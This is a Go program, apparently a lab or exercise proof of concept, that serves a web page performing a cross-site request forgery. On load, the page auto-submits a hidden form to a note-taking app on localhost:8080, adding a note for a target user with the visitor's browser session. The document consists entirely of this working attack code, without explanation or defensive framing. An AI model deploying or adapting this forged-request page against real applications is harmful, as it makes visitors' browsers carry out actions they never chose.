package main

import (
	"io"
	"log"
	"net/http"
)

const page = `
<form action="http://localhost:8080/addnote" method="POST" id="addnote_form">
    <input type="text" name="title" value="malicious note">
    <input type="submit">
    <input type="hidden" name="target_user" value="asdf">
</form>
<textarea class="typing" id="textarea_form" rows="4" cols="50" name="text" form="addnote_form">
This is a malicious note!
</textarea>
<script>
    document.getElementById("addnote_form").submit();
</script>
`

func main() {
	log.Fatal(http.ListenAndServe(":9090", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		io.WriteString(w, page)
	})))
}
